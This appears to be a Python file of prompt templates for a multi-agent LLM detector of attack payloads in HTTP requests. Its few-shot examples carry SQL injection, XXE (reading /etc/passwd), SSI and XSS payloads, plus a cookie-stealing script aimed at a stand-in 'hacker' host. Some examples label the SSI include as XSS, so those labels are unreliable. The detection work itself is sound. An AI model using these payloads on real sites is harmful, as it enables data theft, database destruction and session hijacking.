supervisor_prompt = """
You are a supervisor of a multi-agent system. 
You have a list of agents that you need to supervise. Each agent has a specific task to perform. 
You need to route the agents to the next worker based on the task they are performing. 
You have the following workers available:
- Parser: Parses the HTTP request text and outputs the parsed result as JSON, And check whether each value conforms to a special syntax
- Extractor: Extracts the payload-summary pair from the output of the Parser
- Detector: Detects whether the payload is an attack payload
- Verifier: Verifies the result of the Detector is correct or not
- Reporter: Reports the final result of the attack payload detection
Each worker will output the result and status of the task they perform. When finished, you can respond with FINISH.
"""

parser_prompt = """
You are a http request parser.
You are a highly intelligent and precise text classification model
Your task has two parts:
Task one: extract the HTTP request text and output the parsed result as JSON
Task two: analyze each part of the JSON result and classify it into one of the following categories:
            1. **HTTP** - If the content follows an HTTP request/response format.
            2. **XML** - If the content is structured as XML data.
            3. **SQL** - If the content contains SQL queries or statements.
            4. **HTML** - If the content follows an HTML document structure.
            5. **Unknown** - If the content does not fit into any of the above categories.
Your classification should be based on syntax, keywords, and structural patterns. Provide only the category name in response. If the input is ambiguous, choose the most likely category based on its format and key elements.
"""

classifier_prompt = """
You are a highly intelligent text classification model. Your task is to analyze the given JSON object and classify **each value** into one of the following categories:

1. **XML** → If the content is structured as XML data.
2. **SQL** → If the content contains SQL queries or statements.
3. **XSS** → If the content contains JavaScript statements.
4. **Unknown** → If the content does not fit into any of the above categories.

## **Instructions**
- Analyze each first level value in json. Only output the content of this category.
- The original content of the output is consistent with the value in json
- Decode URL encoding if needed (e.g., `%27` → `'`, `%3B` → `;`).
- Check for SQL keywords like `SELECT`, `INSERT`, `DELETE`, `UPDATE`, `DROP TABLE`.
- Check for XSS keywords like `function`, `var`, `let`, `document`, `eval`.
- Identify XML if it has structured tags like `<tag>value</tag>`. 

## **Input**

"""

classifier_prompt1 = """
You are a highly intelligent text classification model. Your task is to analyze the given JSON object and classify **each value** into one of the following categories:

1. **XML** → If the content is structured as XML data.
2. **SQL** → If the content contains SQL queries or statements.
3. **XSS** → If the content contains JavaScript statements.
4. **Unknown** → If the content does not fit into any of the above categories.

## **Instructions**
- Analyze each first level value in json. Only output the content of this category.
- The original content of the output is consistent with the value in json
- Decode URL encoding if needed (e.g., `%27` → `'`, `%3B` → `;`).
- Check for SQL keywords like `SELECT`, `INSERT`, `DELETE`, `UPDATE`, `DROP TABLE`.
- Check for XSS keywords like `function`, `var`, `let`, `document`, `eval`.
- Identify XML if it has structured tags like `<tag>value</tag>`.

## **Output**
{
  "SQL": {
      ...
  },
  "Unknown": {
      ...
  },
  "XML": {
      ...
  },
  "XSS": {
      ...
  }
}

## **Input**

"""

classifier_prompt2 = """
You are a highly intelligent text classification model. Your task is to analyze the given JSON object and classify **each value** into one of the following categories:

1. **XML** → If the content is structured as XML data.
2. **SQL** → If the content contains SQL queries or statements.
3. **XSS** → If the content contains JavaScript statements.
4. **Unknown** → If the content does not fit into any of the above categories.

## **Instructions**
- Analyze each first level value in json. Only output the content of this category.
- The original content of the output is consistent with the value in json
- Decode URL encoding if needed (e.g., `%27` → `'`, `%3B` → `;`).
- Check for SQL keywords like `SELECT`, `INSERT`, `DELETE`, `UPDATE`, `DROP TABLE`.
- Check for XSS keywords like `function`, `var`, `let`, `document`, `eval`.
- Identify XML if it has structured tags like `<tag>value</tag>`.

## **Output**
"SQL": {
    ...
},
"Unknown": {
    ...
},
"XML": {
    ...
},
"XSS": {
    ...
}

## **Input**

"""

classifier_prompt3 = """
You are a highly intelligent text classification model. Your task is to analyze the given JSON object and classify **each value** into one of the following categories:

1. **XML** → If the content is structured as XML data.
2. **SQL** → If the content contains SQL queries or statements.
3. **XSS** → If the content contains JavaScript statements.
4. **Unknown** → If the content does not fit into any of the above categories.

## **Instructions**
- Organize the output and make full use of tools to make the output meet the expected output
- Analyze each first level value in json. Only output the content of this category.
- The original content of the output is consistent with the value in json
- Decode URL encoding if needed (e.g., `%27` → `'`, `%3B` → `;`).
- Check for SQL keywords like `SELECT`, `INSERT`, `DELETE`, `UPDATE`, `DROP TABLE`.
- Check for XSS keywords like `function`, `var`, `let`, `document`, `eval`.
- Identify XML if it has structured tags like `<tag>value</tag>`.

## **Output Format**
SQL: {...}, Unknown: {...}, XSS: {...}, XML: {...} 

## **Input**

"""

classifier_prompt4 = """
You are a highly intelligent text classification model. Your task is to analyze the given JSON object and classify **each value** into one of the following categories:

1. **XML** → If the content is structured as XML data.
2. **SQL** → If the content contains SQL queries or statements.
3. **XSS** → If the content contains JavaScript statements.
4. **Unknown** → If the content does not fit into any of the above categories.

## **Instructions**
- Organize the output and make full use of tools to make the output meet the expected output
- Analyze each first level value in json. Only output the content of this category.
- The original content of the output is consistent with the value in json
- Decode URL encoding if needed (e.g., `%27` → `'`, `%3B` → `;`).
- Check for SQL keywords like `SELECT`, `INSERT`, `DELETE`, `UPDATE`, `DROP TABLE`.
- Check for XSS keywords like `function`, `var`, `let`, `document`, `eval`.
- Identify XML if it has structured tags like `<tag>value</tag>`.
- **Important:** If you don't have definitive evidence to classify it, please classify it as Unknown

## **Output Format**
SQL: {...}, Unknown: {...}, XSS: {...}, XML: {...} 

## **Input**

"""

classifier_prompt4_without_structure_output = """
You are a highly intelligent text classification model. Your task is to analyze the given JSON object and classify **each value** into one of the following categories:

1. **XML** → If the content is structured as XML data.
2. **SQL** → If the content contains SQL queries or statements.
3. **XSS** → If the content contains JavaScript statements.
4. **Unknown** → If the content does not fit into any of the above categories.

## **Instructions**
- Organize the output and make full use of tools to make the output meet the expected output
- Analyze each first level value in json. Only output the content of this category.
- The original content of the output is consistent with the value in json
- Decode URL encoding if needed (e.g., `%27` → `'`, `%3B` → `;`).
- Check for SQL keywords like `SELECT`, `INSERT`, `DELETE`, `UPDATE`, `DROP TABLE`.
- Check for XSS keywords like `function`, `var`, `let`, `document`, `eval`.
- Identify XML if it has structured tags like `<tag>value</tag>`.
- **Important:** If you don't have definitive evidence to classify it, please classify it as Unknown
- The results of the analysis using the ```json``` package

## **Output Format**
```json
SQL: {...}, Unknown: {...}, XSS: {...}, XML: {...} 
```

## **Example**
For http request as follow:
{
    "url": "http://localhost:8080/tienda1/publico/anadir.jsp",
    "query_params": {
        "id": [
            "2"
        ],
        "nombre": [
            "Jam�n Ib�rico"
        ],
        "precio": [
            "85"
        ],
        "cantidad": [
            "'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%"
        ],
        "B1": [
            "A�adir al carrito"
        ]
    },
    "headers": {
        "User-Agent": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
        "Pragma": "no-cache",
        "Cache-control": "no-cache",
        "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
        "Accept-Encoding": "x-gzip, x-deflate, gzip, deflate",
        "Accept-Charset": "utf-8, utf-8;q=0.5, *;q=0.5",
        "Accept-Language": "en",
        "Host": "localhost:8080",
        "Cookie": "JSESSIONID=B92A8B48B9008CD29F622A994E0F650D",
        "Connection": "close"
    },
    "body_params": {}
}
the follow result is:
```json
{
  "SQL": {
    "cantidad": [
      "'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%'"
    ]
  },
  "Unknown": {
    "url": [
      "http://localhost:8080/tienda1/publico/anadir.jsp"
    ],
    "query_params": {
      "id": [
        "2"
      ],
      "nombre": [
        "Jamón Ibérico"
      ],
      "precio": [
        "85"
      ],
      "B1": [
        "Añadir al carrito"
      ]
    },
    "headers": {
      "User-Agent": [
        "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
      ],
      "Pragma": [
        "no-cache"
      ],
      "Cache-control": [
        "no-cache"
      ],
      "Accept": [
        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
      ],
      "Accept-Encoding": [
        "x-gzip, x-deflate, gzip, deflate"
      ],
      "Accept-Charset": [
        "utf-8, utf-8;q=0.5, *;q=0.5"
      ],
      "Accept-Language": [
        "en"
      ],
      "Host": [
        "localhost:8080"
      ],
      "Cookie": [
        "JSESSIONID=B92A8B48B9008CD29F622A994E0F650D"
      ],
      "Connection": [
        "close"
      ]
    }
  },
  "XSS": {},
  "XML": {}
}
```

## **Input**

"""

classifier_prompt4_without_structure_output1 = """
You are a highly intelligent text classification model. Your task is to analyze the given JSON object and classify **each value** into one of the following categories:
1. **XML** → If the content is structured as XML data.
2. **SQL** → If the content contains SQL queries or statements.
3. **JavaScript** → If the content contains JavaScript statements.
4. **Unknown** → If the content does not fit into any of the above categories.

## **Instructions**
- Organize the output and make full use of tools to make the output meet the expected output
- The original content of the output is consistent with the value in json
- Decode URL encoding if needed (e.g., `%27` → `'`, `%3B` → `;`).
- Check for SQL keywords like `SELECT`, `INSERT`, `DELETE`, `UPDATE`, `DROP TABLE`.
- Check for JavaScript keywords like `function`, `var`, `let`, `document`, `eval`.
- Identify XML if it has structured tags like `<tag>value</tag>`.
- **Important:** If you don't have definitive evidence to classify it, please classify it as Unknown
- There are multiple values ​​for query_params and body_params. They do not have to be put in the same category. The specific category examines each specific value.

## **Output Format**
```json
SQL: {...}, Unknown: {...}, JavaScript: {...}, XML: {...} 
```

## **Example**
For http request as follow:
{
    "url": "http://localhost:8080/tienda1/publico/anadir.jsp",
    "query_params": {
        "id": [
            "2"
        ],
        "cantidad": [
            "'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%"
        ]
    },
    "headers": {
        "User-Agent": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
        "Pragma": "no-cache"
    },
    "body_params": {}
}
step1: check the url, this belongs to `Unknown`
step2: check the query_params, the param id belongs to `Unknown`, and the param cantidad belongs to `SQL`
step3: check the headers, the User-Agent belongs to `Unknown`
As a result, the final output as follows:
```json
{
  "SQL": {
    "query_params": {
      "cantidad": [
        "'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%'"
      ]
    }
  },
  "Unknown": {
    "url": [
      "http://localhost:8080/tienda1/publico/anadir.jsp"
    ],
    "query_params": {
      "id": [
        "2"
      ]
    },
    "headers": {
      "User-Agent": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
      "Pragma": "no-cache"
    }
  },
  "JavaScript": {},
  "XML": {}
}
```

## **Input**

"""

detector_anomalous_prompt = """
You are a http traffic expert, you are very good at analyzing http traffic!
Your task is to analyze the given JSON object and detect **each value** whether is anomalous or normal.

## **Instructions**
- Organize the output and make full use of tools to make the output meet the expected output
- The output structure consists of two parts, the result and the cause, starting with Result: and Cause: respectively.
- The exceptions include the existence of drive letter G, Special files like asf-logo-wide.gif~ etc.

## **Input**
{input}
"""

detector_anomalous_prompt_without_structure_output = """
You are a http traffic expert, you are very good at analyzing http traffic! Your task is to analyze the given JSON object and detect whether is anomalous or normal.
Abnormal behaviors include the following:
- Find injection location, inserting malicious code into external input parameters to test for injection vulnerabilities, such as add character `+` to detect
- Error Report, intentionally triggering error messages to obtain internal system information, such as B1A and rememberA, added the character A after the correct parameter
- Abnormal file upload, attempting to upload malicious files to exploit insecure file upload functionalities, such as direccion=C/ or pwd=G/ etc.
- Download sensitive files, accessing and downloading sensitive files, such as asf-logo-wide.gif~ and .bak, etc.
- Find management backend address, scanning for and attempting to access common backend management entry point, such as login.jsp, Application_VBScript.asp, etc.
- Request illegal request method, such as OPTIONS, TRACE, CONNECT, PUT, DELETE etc.

## **Output Format**
Result: ...
Cause: ...

## **Instructions**
- Check the four kind of abnormal behaviors provided above step by step, 

## **Example**
the input as follows:
{
    "url": "http://localhost:8080/tienda1/publico/anadir.jsp",
    "query_params": {
        "id": [
            "2/"
        ],
        "errorMsg": [
            "+"
        ],
        "rememberA": [
            "on"
        ]
    },
    "headers": {
        "User-Agent": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
    },
    "body_params": {}
}
step1: analysize the url, the reuslt is normal, this is a typical http request url
step2: analysize the query_params, the result is anomalous, for param id and errorMsg caused Find injection location(add malicious character / or +), for param rememberA caused Error Report(add extra character A)
step3: analysize the headers, the result is normal, this is right format
step4: analysize the body_params, the provided is none, so it is normal
as a result, the final output is 
Result: anomalous
Cause: The 'id' query parameter has a trailing slash '/'. The 'errorMsg' query parameter contains a plus sign (+), which may not represent an error message properly. The `rememberA` has extra character A

## **Input**
{input}
"""

detector_anomalous_prompt_without_structure_output_with_fintune_prompt = """
Please check whether the following request has malicious behavior
{input}
"""

detector_anomalous_prompt_without_structure_output_with_fintune_prompt1 = """
You are a http traffic expert, you are very good at analyzing http traffic! Your task is to analyze the given JSON object and detect whether is anomalous or normal.
Abnormal behaviors include the following:
- Find injection location, inserting malicious code into external input parameters to test for injection vulnerabilities, such as add character `+` to detect
- Error Report, intentionally triggering error messages to obtain internal system information, such as B1A and rememberA, added the character A after the correct parameter
- Abnormal file upload, attempting to upload malicious files to exploit insecure file upload functionalities, such as direccion=C/ or pwd=G/ etc.
- Download sensitive files, accessing and downloading sensitive files, such as asf-logo-wide.gif~ and .bak, etc.
- Find management backend address, scanning for and attempting to access common backend management entry point, such as login.jsp, Application_VBScript.asp, etc.
- Request illegal request method, such as OPTIONS, TRACE, CONNECT, PUT, DELETE etc.

{input}
"""

detector_anomalous_prompt_without_structure_output_with_fintune_prompt2 = """
You are a http traffic expert, you are very good at analyzing http traffic! Your task is to analyze the given http request object and detect whether is anomalous or normal.
Abnormal behaviors include the following:
- Find injection location, inserting malicious code into external input parameters to test for injection vulnerabilities
- Error Report, intentionally triggering error messages to obtain internal system information
- Abnormal file upload, attempting to upload malicious files to exploit insecure file upload functionalities
- Download sensitive files, accessing and downloading sensitive files
- Find management backend address, scanning for and attempting to access common backend management entry point
- Request illegal request method, updating or deleting relevant resources.
So, please check whether the following request has malicious behavior

{input}
"""

detector_anomalous_prompt_without_structure_output_with_fintune_prompt2_0905 = """
You are a http traffic expert, you are very good at analyzing http traffic! Your task is to analyze the given http request object and detect whether is anomalous or normal.
It is worth noting that the http requests are usually url encoded once or even twice, please pay attention to this point when you analyze the http request.
Abnormal behaviors include the following:
- Find injection location, inserting malicious code into external input parameters to test for injection vulnerabilities, such as using characters like `+` or `|` to detect
- Error Report, intentionally triggering error messages to obtain internal system information, such as "rememberA" "idA" "errorMsgA" "B2A" "apellidosA" "B1A" "loginA" "modoA" "ciudadA" "pwdA" "emailA" "nombreA" "precioA" "dniA" "cantidadA" "ntcA" "B1A" "provinciaA" "cpA" "direccionA" "passwordA", added the character A after the correct parameter
- Download sensitive files, accessing and downloading sensitive files, such as asf-logo-wide.gif~, .bak and .inc, etc.
So, please check whether the following request has malicious behavior

{input}
"""

extractor_prompt = """
You are an {expertName} syntax expert and your task is to analyze the actions of a given {category} statement.
You should return none if the statement is not that category. 

## **Example:**
Input: OR 1 = 1 -- -
Output: This particular statement takes advantage of the logical condition `1 = 1`, which is always true. By appending `-- -` after the initial part of the query

## **Instructions**
- 

## **Input**
{input}
"""

extractor_prompt1 = """
You are an {expertName} syntax expert and your task is to analyze the function of each piece of grammar of a given {category} statement.
You should return none if the statement is not that category.

## **Example:**
Input: OR 1 = 1 -- -
Output: This particular statement takes advantage of the logical condition `1 = 1`, which is always true. By appending `-- -` after the initial part of the query

## **Instructions**
- Analyze the role of each key part of a given statement
- There is no need to determine whether there is a vulnerability, just parse the grammatical meaning of the corresponding statement
- If the given statement does not belong to the corresponding grammar, please output 'return none' in the reply, 

## **Input**
{input}
"""

extractor_prompt2 = """
You are an {expertName} syntax expert and your task is to analyze the function of each piece of grammar of a given {category} statement.
You should return none if the statement is not that category.

## **Example:**
Input: OR 1 = 1 -- -
Output: This particular statement takes advantage of the logical condition `1 = 1`, which is always true. By appending `-- -` after the initial part of the query

## **Instructions**
- Analyze the role of each key part of a given statement
- There is no need to determine whether there is a vulnerability, just parse the grammatical meaning of the corresponding statement
- **Return none** is output only if the given statement does not belong to the corresponding syntax. If it conforms to the syntax, the return none keyword is disabled.

## **Input**
{input}
"""
# less token
extractor_prompt3 = """
You are an {expertName} syntax expert and your task is to analyze the function of each piece of grammar of a given {category} statement.
You should return none if the statement is not that category.

## **Example:**
Input: OR 1 = 1 -- -
Output: This particular statement takes advantage of the logical condition `1 = 1`, which is always true. By appending `-- -` after the initial part of the query

## **Instructions**
- Analyze the role of each key part of a given statement
- There is no need to determine whether there is a vulnerability, just parse the grammatical meaning of the corresponding statement
- The output only contains the grammatical results of the provided statements, without the need for a detailed analysis process.
- **Return none** is output only if the given statement does not belong to the corresponding syntax. If it conforms to the syntax, the return none keyword is disabled.

## **Input**
{input}
"""

extractor_prompt4 = """
You are an {expertName} syntax expert and your task is to analyze the function of each piece of grammar of a given {category} statement.
You should return none if the statement is not that category.

## **Example:**
Input: OR 1 = 1 -- -
Output: This particular statement takes advantage of the logical condition `1 = 1`, which is always true. By appending `-- -` after the initial part of the query

## **Instructions**
- Analyze the role of each key part of a given statement
- There is no need to determine whether there is a vulnerability, just parse the grammatical meaning of the corresponding statement
- The output only contains the grammatical results of the provided statements, without the need for a detailed analysis process.
- **Return none** is output only if the given statement does not belong to the corresponding syntax. If it conforms to the syntax, the return none keyword is disabled.
- The output structure consists of two parts, the result and the suammry, starting with Result: and Suammry: respectively.

## **Input**
{input}
"""

extractor_prompt5 = """
You are an {expertName} syntax expert and your task is to analyze the function of each piece of grammar of a given {category} statement.

## **Example:**
Input: OR 1 = 1 -- -
Output: This particular statement takes advantage of the logical condition `1 = 1`, which is always true. By appending `-- -` after the initial part of the query

## **Output:**
Result: ...
Output: ...

## **Instructions**
- Analyze the role of each key part of a given statement
- There is no need to determine whether there is a vulnerability, just parse the grammatical meaning of the corresponding statement
- The output only contains the grammatical results of the provided statements, without the need for a detailed analysis process.
- The output structure consists of two parts, the result and the output, starting with Result: and Output: respectively.
- If the given statement does not belong to the {category} syntax, the Result is error_syntax. Otherwise, the output is a grammatical summary of the given statement, similar to the example in Example

## **Input**
{input}
"""

extractor_prompt5_without_structure_output = """
You are an {expertName} syntax expert and your task is to analyze the function of each piece of grammar of a given {category} statement.

## **Output:**
Result: ...
Output: ...

## **Instructions**
- Analyze the role of a given statement
- There is no need to determine whether there is a vulnerability, just parse the grammatical meaning of the corresponding statement
- The output only contains the grammatical results of the provided statements, without the need for a detailed analysis process.
- As long as there is sufficient evidence to prove that it satisfies the given syntax, it is classified as true_syntax
- Only judge whether the independent statement satisfies the syntax. If it is part of other statements, it will be classified as error_syntax
- A single string cannot determine whether it belongs to the corresponding syntax. If there is no context label, it is regarded as error_syntax
- If the given statement does not belong to the {category} syntax, the Result is error_syntax. Otherwise, the output is a grammatical summary of the given statement, similar to the example in Example

## **Example:**
example one:
Input: OR 1 = 1 -- -
step1: Due to the input statement contains the or and -- keywords, it is determined that it satisfies the SQL syntax. The Result is *true_syntax*, and the second step is continued.
step2: Analyze the role of the input statement in SQL syntax. The Output is *This particular statement takes advantage of the logical condition `1 = 1`, which is always true. By appending `-- -` after the initial part of the query*
so, the final output as follows:
Result: true_syntax
Output: This particular statement takes advantage of the logical condition `1 = 1`, which is always true. By appending `-- -` after the initial part of the query

example two:
Input: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
step1: First, if the input statement does not meet the SQL syntax, the Result is *error_syntax* and the Output is null.
so, the final output as follows:
Result: error_syntax
Output: null

## **Input**
{input}
"""

extractor_prompt6_without_structure_output = """
You are an {expertName} syntax expert and your task is to analyze the function of each piece of grammar of a given {category} statement.

## **Output:**
Result: ...
Output: ...

## **Instructions**
- Analyze the role of a given statement
- There is no need to determine whether there is a vulnerability, just parse the grammatical meaning of the corresponding statement
- The output only contains the grammatical results of the provided statements, without the need for a detailed analysis process.
- As long as there is sufficient evidence to prove that it satisfies the given syntax, it is classified as true_syntax
- Only judge whether the given string is grammatical, without making any additional additions. For example, given the string on, do not treat it as javascript syntax because it may be part of the onclick event.
- If the given statement does not belong to the {category} syntax, the Result is error_syntax. Otherwise, the output is a grammatical summary of the given statement, similar to the example in Example
- In particular, if you think the result is error_syntax, give other syntax you think is appropriate *(SQL, JavaScript, XML)* If there is no appropriate syntax selection, then Output is null

Here are some examples of how to analyze and extract the syntax of the payload:

example 1:
input: OR 1 = 1 -- -
analysis: step1, Due to the input statement contains the or and -- keywords, it is determined that it satisfies the SQL syntax. The Result is *true_syntax*, and the second step is continued. step2, Analyze the role of the input statement in SQL syntax. The Output is *This particular statement takes advantage of the logical condition `1 = 1`, which is always true. By appending `-- -` after the initial part of the query*. so, Result: true_syntax; Output: This particular statement takes advantage of the logical condition `1 = 1`, which is always true. By appending `-- -` after the initial part of the query

example 2:
input: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
analysis: step1, First, if the input statement does not meet the SQL syntax, the Result is *error_syntax*; step2, After checking that the input does not comply with the syntax of SQL, JavaScript, XML, etc. so, the final output as follows:Result: error_syntax Output: null

example 3:
input: Pasar+por+caja%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E
analysis: step1, the decoded payload is Pasar por caja<!--#include file="archivo_secreto" -->; step2, Check whether it belongs to XML syntax. After checking, it is found that it does not belong to XML syntax, the Result is *error_syntax*; step3, Check again whether it belongs to the other two syntaxes (SQL, JavaScript), and find that it belongs to the JavaScript code. So, Result: error_syntax; Output: JavaScript

Now, please analyze the following payload:
input: {input}
analysis: 
"""

preprocessor_vuln_detect_prompt = """
You are a cyber security expert. Your task is to analyze the given payload and determine what the possible vulnerability type.

## **Instruction:**
- Only the type of *possible vulnerability* needs to be determined, and the specific detection of the vulnerability is left to other colleagues for completion
- Optional vulnerability types are `SQL Injection Attack`, `XSS Attack`, `XXE Attack`, and `Other Vuln`

Here are some examples of how to analyze the attack:
Example 1:
payload: 1' or '1' = '1
analysis: this is a classic SQL injection attack that manipulates the query logic. So, Result: SQL Injection Attack

Example 2:
payload: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
analysis: this payload contains an XXE attack that attempts to read the contents of the /etc/passwd file. So, Result: XXE Attack

Example 3:
payload: Pasar+por+caja%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E
analysis: the decoded payload is Pasar por caja<!--#include file="archivo_secreto" -->, The payload contains an XSS attack that attempts to include a secret file using the server-side include directive. So, Result: XSS Attack
"""

detector_payload_prompt = """
You are a powerful SQL injection expert. 
Your task is to check whether a given statement has an attack. 
You can call tools to retrieve relevant content from the malicious payload knowledge base to make judgments.

## **Instructions**
- It is necessary to use tools to query relevant data to check the attack and ensure the accuracy of the results.
- The output structure consists of two parts, the result and the cause, starting with Result: and Cause: respectively.
"""

detector_payload_cot_prompt = """
You are a powerful SQL injection expert. Your task is to check whether a given statement has an attack. 
Here are some examples of how to analyze the attack:

Example 1:
payload: 1' or '1' = '1
analysis: A numeric value 1 followed by a single quote, typically used to close an existing quote in the original query, Combined with OR: Always returns true, bypassing the intended WHERE clause. So, Result: SQL Injection Attack, Cause: The payload is a classic SQL injection attack that manipulates the query logic.; 

Example 2:
payload: 183%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--
analysis: the result of url decoding is 183','0','0');waitfor delay '0:0:15';--, The payload contains a SQL injection attack that uses the waitfor delay command to introduce a time delay in the response. This can be used to test for SQL injection vulnerabilities and potentially extract data from the database. So, Result: SQL Injection Attack, Cause: The payload is a SQL injection attack that introduces a time delay in the response, indicating a potential vulnerability.;

Example 3:
payload: Guimera+Faraco%22+AND+%221%22%3D%221
analysis: the result of url decoding is Guimera Faraco" AND "1"="1, The payload contains a SQL injection attack that uses the AND operator to manipulate the query logic. This can be used to bypass authentication or extract data from the database. So, Result: SQL Injection Attack, Cause: The payload is a SQL injection attack that manipulates the query logic using the AND operator.;

Example 4:
payload: entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25
analisys: the result of url decoding is entrar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%, The payload contains a SQL injection attack that attempts to drop a table and select data from another table. This can be used to manipulate the database and extract sensitive information. So, Result: SQL Injection Attack, Cause: The payload is a SQL injection attack that attempts to drop a table and select data from another table, indicating a potential vulnerability.;

here are some optional attack type: `SQL Injection Attack`, `XSS Attack`, `XXE Attack`, and `SSI Attack`, `Other Attack`
Now, please analyze the following payload:
payload: {payload}
analysis:
"""

detector_payload_cot_advice_prompt = """
In the last round, you and your colleague detector_summary made inconsistent judgments. Here are some optimization tips for you:
{detector_content_advice}
Here are some examples of how to analyze the attack:

Example 1:
payload: 1' or '1' = '1
analysis: A numeric value 1 followed by a single quote, typically used to close an existing quote in the original query, Combined with OR: Always returns true, bypassing the intended WHERE clause. So, Result: SQL Injection Attack, Cause: The payload is a classic SQL injection attack that manipulates the query logic.; 

Example 2:
payload: 183%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--
analysis: the result of url decoding is 183','0','0');waitfor delay '0:0:15';--, The payload contains a SQL injection attack that uses the waitfor delay command to introduce a time delay in the response. This can be used to test for SQL injection vulnerabilities and potentially extract data from the database. So, Result: SQL Injection Attack, Cause: The payload is a SQL injection attack that introduces a time delay in the response, indicating a potential vulnerability.;

Example 3:
payload: Guimera+Faraco%22+AND+%221%22%3D%221
analysis: the result of url decoding is Guimera Faraco" AND "1"="1, The payload contains a SQL injection attack that uses the AND operator to manipulate the query logic. This can be used to bypass authentication or extract data from the database. So, Result: SQL Injection Attack, Cause: The payload is a SQL injection attack that manipulates the query logic using the AND operator.;

Example 4:
payload: entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25
analisys: the result of url decoding is entrar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%, The payload contains a SQL injection attack that attempts to drop a table and select data from another table. This can be used to manipulate the database and extract sensitive information. So, Result: SQL Injection Attack, Cause: The payload is a SQL injection attack that attempts to drop a table and select data from another table, indicating a potential vulnerability.;

here are some optional attack type: `SQL Injection Attack`, `XSS Attack`, `XXE Attack`, and `SSI Attack`, `Other Attack`
Now, please combine the suggestions and give your new judgment:
payload: {payload}
analysis:
"""

detector_content_advice_prompt = """
In the last round, you and your colleague detector_summary made inconsistent judgments. Here are some optimization tips for you:
{detector_content_advice}
The following is the content to be tested, please combine the suggestions and give your new judgment:

"""

detector_summary_prompt = """
You are a powerful SQL injection expert.
Your task is to check whether the given statement grammar summary contains any attack operations.
You can call tools to retrieve relevant content from the malicious summary of payload knowledge base to make judgments.

here are some optional attack type: `SQL Injection Attack`, `XSS Attack`, `XXE Attack`, and `SSI Attack`, `Other Attack`
## **Instructions**
- It is necessary to use tools to query relevant data to check the attack and ensure the accuracy of the results.
- The output structure consists of two parts, the result and the cause, starting with Result: and Cause: respectively.
"""

detector_summary_advice_prompt = """
In the last round, you and your colleague detector_content made inconsistent judgments. Here are some optimization tips for you:
{detector_summary_advice}
here are some optional attack type: `SQL Injection Attack`, `XSS Attack`, `XXE Attack`, and `SSI Attack`, `Other Attack`
The following is the content to be tested, please combine the suggestions and give your new judgment:

"""

detector_xss_payload_prompt = """
You are a powerful XSS expert. 
Your task is to check whether a given statement has an attack. 
You can call tools to retrieve relevant content from the malicious payload knowledge base to make judgments.

## **Instructions**
- It is necessary to use tools to query relevant data to check the attack and ensure the accuracy of the results.
- The output structure consists of two parts, the result and the cause, starting with Result: and Cause: respectively.
"""

detector_xss_summary_prompt = """
You are a powerful XSS expert.
Your task is to check whether the given statement grammar summary contains any attack operations.
You can call tools to retrieve relevant content from the malicious summary of payload knowledge base to make judgments.

here are some optional attack type: `SQL Injection Attack`, `XSS Attack`, `XXE Attack`, and `SSI Attack`, `Other Attack`
## **Instructions**
- It is necessary to use tools to query relevant data to check the attack and ensure the accuracy of the results.
- The output structure consists of two parts, the result and the cause, starting with Result: and Cause: respectively.
"""

detector_xxe_summary_prompt = """
You are a powerful XXE expert.
Your task is to check whether the given statement grammar summary contains any attack operations.
You can call tools to retrieve relevant content from the malicious summary of payload knowledge base to make judgments.

here are some optional attack type: `SQL Injection Attack`, `XSS Attack`, `XXE Attack`, and `SSI Attack`, `Other Attack`
## **Instructions**
- It is necessary to use tools to query relevant data to check the attack and ensure the accuracy of the results.
- The output structure consists of two parts, the result and the cause, starting with Result: and Cause: respectively.
"""

detector_xss_payload_cot_prompt = """
You are a powerful XSS attack expert. Your task is to check whether a given statement has an attack. 
Here are some examples of how to analyze the attack:

Example 1:
payload: bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org
analysis: the result of url decoding is bob<SCript>alert(Paros)</scrIPT>.parosproxy.org, The payload contains a XSS attack that uses the alert function to display a message. This can be used to test for XSS vulnerabilities and potentially execute malicious scripts in the user's browser. So, Result: XSS Attack, Cause: The payload is a XSS attack that uses the alert function to display a message, indicating a potential vulnerability.;

Example 2:
payload: registro%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E
analysis: the result of url decoding is registro<SCRIPT>alert("Paros");</SCRIPT>, The payload contains a XSS attack that uses the alert function to display a message. This can be used to test for XSS vulnerabilities and potentially execute malicious scripts in the user's browser. So, Result: XSS Attack, Cause: The payload is a XSS attack that uses the alert function to display a message, indicating a potential vulnerability.;

Example 3:
payload: %3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E
